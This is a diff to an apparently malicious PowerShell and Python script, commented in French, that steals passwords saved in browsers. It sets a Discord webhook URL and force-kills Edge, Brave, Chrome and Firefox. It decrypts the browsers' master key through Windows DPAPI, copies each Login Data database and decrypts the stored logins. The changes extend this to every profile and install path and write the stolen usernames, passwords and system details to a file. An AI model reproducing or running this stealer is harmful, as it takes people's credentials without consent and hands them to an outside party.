@@ -1,14 +1,7 @@
 $wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"
 
-# Kill browsers plus agressivement
-taskkill /F /IM msedge.exe 2>$null
-taskkill /F /IM brave.exe 2>$null
-taskkill /F /IM chrome.exe 2>$null
-taskkill /F /IM firefox.exe 2>$null
-# Tuer aussi les processus en arrière-plan
-taskkill /F /FI "IMAGENAME eq msedge.exe*" 2>$null
-taskkill /F /FI "IMAGENAME eq brave.exe*" 2>$null
-taskkill /F /FI "IMAGENAME eq chrome.exe*" 2>$null
+# Kill browsers TRÈS agressivement
+Get-Process -Name msedge,brave,chrome,firefox -EA 0 | Stop-Process -Force -EA 0
 Start-Sleep -Seconds 3
 
 try{
@@ -38,7 +31,7 @@ if($needInstall){
 cd $pyPath
 
 @'
-import os,json,base64,sqlite3,shutil,win32crypt,socket,platform,getpass,datetime,time
+import os,json,base64,sqlite3,shutil,win32crypt,socket,platform,getpass,datetime,time,glob
 from Crypto.Cipher import AES
 
 try:
@@ -57,23 +50,19 @@ language=locale.getdefaultlocale()[0] if locale.getdefaultlocale()[0] else "N/A"
 
 def d(db,st,n):
  try:
-  # Vérifier si les fichiers existent
-  if not os.path.exists(db):
-   return []
-  if not os.path.exists(st):
+  if not os.path.exists(db) or not os.path.exists(st):
    return []
   
-  # Lire la clé de chiffrement
   with open(st,'r',encoding='utf-8') as f:
    local_state=json.load(f)
   
   encrypted_key=base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-  encrypted_key=encrypted_key[5:]  # Enlever "DPAPI"
+  encrypted_key=encrypted_key[5:]
   k=win32crypt.CryptUnprotectData(encrypted_key,None,None,None,0)[1]
   
-  # Copier le fichier avec retry
-  temp_db=f"t_{n}.db"
-  max_retries=3
+  temp_db=f"t_{n}_{os.getpid()}.db"
+  max_retries=5
+  
   for attempt in range(max_retries):
    try:
     if os.path.exists(temp_db):
@@ -82,14 +71,13 @@ def d(db,st,n):
     break
    except:
     if attempt < max_retries-1:
-     time.sleep(1)
+     time.sleep(0.5)
     else:
      return []
   
-  # Lire la base de données
   r=[]
   try:
-   c=sqlite3.connect(temp_db)
+   c=sqlite3.connect(temp_db,timeout=10)
    cursor=c.cursor()
    cursor.execute("SELECT origin_url,username_value,password_value FROM logins WHERE username_value!=''")
    
@@ -100,7 +88,6 @@ def d(db,st,n):
      enc_pwd=row[2]
      
      if enc_pwd and len(enc_pwd)>15:
-      # Déchiffrement AES-GCM
       nonce=enc_pwd[3:15]
       ciphertext=enc_pwd[15:-16]
       tag=enc_pwd[-16:]
@@ -109,15 +96,13 @@ def d(db,st,n):
       pwd=cipher.decrypt_and_verify(ciphertext,tag).decode('utf-8','ignore')
       
       r.append(f"[{n}] {url}\nUsername: {user}\nPassword: {pwd}\n")
-    except Exception as e:
-     # Ignorer les erreurs de déchiffrement individuelles
+    except:
      pass
    
    c.close()
-  except Exception as e:
+  except:
    pass
   finally:
-   # Nettoyer le fichier temporaire
    try:
     if os.path.exists(temp_db):
      os.remove(temp_db)
@@ -126,35 +111,106 @@ def d(db,st,n):
   
   return r
   
- except Exception as e:
+ except:
   return []
 
-# Collecter les résultats de TOUS les navigateurs
+def find_browser_profiles(browser_paths,browser_name):
+ """Cherche tous les profils dans tous les chemins possibles"""
+ results=[]
+ 
+ for base_path in browser_paths:
+  if not os.path.exists(base_path):
+   continue
+  
+  # Vérifier Local State
+  local_state=os.path.join(base_path,"Local State")
+  if not os.path.exists(local_state):
+   continue
+  
+  # Profil Default
+  default_login=os.path.join(base_path,"Default","Login Data")
+  if os.path.exists(default_login):
+   pwd_list=d(default_login,local_state,f"{browser_name}-Default")
+   results.extend(pwd_list)
+  
+  # Tous les autres profils (Profile 1, Profile 2, ...)
+  for profile_dir in glob.glob(os.path.join(base_path,"Profile*")):
+   profile_name=os.path.basename(profile_dir)
+   profile_login=os.path.join(profile_dir,"Login Data")
+   if os.path.exists(profile_login):
+    pwd_list=d(profile_login,local_state,f"{browser_name}-{profile_name}")
+    results.extend(pwd_list)
+  
+  # Profils "Person X" (certaines installations)
+  for profile_dir in glob.glob(os.path.join(base_path,"Person*")):
+   profile_name=os.path.basename(profile_dir)
+   profile_login=os.path.join(profile_dir,"Login Data")
+   if os.path.exists(profile_login):
+    pwd_list=d(profile_login,local_state,f"{browser_name}-{profile_name}")
+    results.extend(pwd_list)
+ 
+ return results
+
+# Chemins possibles pour chaque navigateur
+edge_paths=[
+ os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),
+ os.path.expandvars(r"%APPDATA%\Microsoft\Edge\User Data"),
+ r"C:\Program Files\Microsoft\Edge\User Data",
+ r"C:\Program Files (x86)\Microsoft\Edge\User Data"
+]
+
+brave_paths=[
+ os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"),
+ os.path.expandvars(r"%APPDATA%\BraveSoftware\Brave-Browser\User Data"),
+ r"C:\Program Files\BraveSoftware\Brave-Browser\User Data",
+ r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\User Data",
+ # Brave Nightly/Beta
+ os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser-Nightly\User Data"),
+ os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser-Beta\User Data")
+]
+
+chrome_paths=[
+ os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
+ os.path.expandvars(r"%APPDATA%\Google\Chrome\User Data"),
+ r"C:\Program Files\Google\Chrome\User Data",
+ r"C:\Program Files (x86)\Google\Chrome\User Data"
+]
+
+# Collecter TOUS les résultats
 res=[]
 browsers=[]
 
 # EDGE
-e=os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
-if os.path.exists(f"{e}\\Default\\Login Data"):
- edge_res=d(f"{e}\\Default\\Login Data",f"{e}\\Local State","EDGE")
+edge_res=find_browser_profiles(edge_paths,"EDGE")
+if edge_res:
  res.extend(edge_res)
  browsers.append(f"Edge: {len(edge_res)} passwords")
 
 # BRAVE
-b=os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
-if os.path.exists(f"{b}\\Default\\Login Data"):
- brave_res=d(f"{b}\\Default\\Login Data",f"{b}\\Local State","BRAVE")
+brave_res=find_browser_profiles(brave_paths,"BRAVE")
+if brave_res:
  res.extend(brave_res)
  browsers.append(f"Brave: {len(brave_res)} passwords")
 
 # CHROME
-g=os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
-if os.path.exists(f"{g}\\Default\\Login Data"):
- chrome_res=d(f"{g}\\Default\\Login Data",f"{g}\\Local State","CHROME")
+chrome_res=find_browser_profiles(chrome_paths,"CHROME")
+if chrome_res:
  res.extend(chrome_res)
  browsers.append(f"Chrome: {len(chrome_res)} passwords")
 
-# Informations système
+# DEBUG: Lister les chemins trouvés
+debug_info=[]
+debug_info.append("\nDEBUG - Browser paths found:")
+for path in edge_paths:
+ if os.path.exists(path):
+  debug_info.append(f"✓ {path}")
+for path in brave_paths:
+ if os.path.exists(path):
+  debug_info.append(f"✓ {path}")
+for path in chrome_paths:
+ if os.path.exists(path):
+  debug_info.append(f"✓ {path}")
+
 browser_info="\n".join(browsers) if browsers else "No browsers found"
 
 info=f"""{'='*60}
@@ -179,14 +235,15 @@ BROWSERS DETECTED:
 
 TOTAL PASSWORDS: {len(res)}
 {'='*60}
+{''.join(debug_info)}
+{'='*60}
 
 """
 
-# Toujours créer le fichier, même s'il n'y a pas de résultats
 with open("p.txt","w",encoding="utf-8") as f:
  f.write(info)
  if res:
-  f.write("".join(res))
+  f.write("\n".join(res))
  else:
   f.write("No passwords found.\n")
 
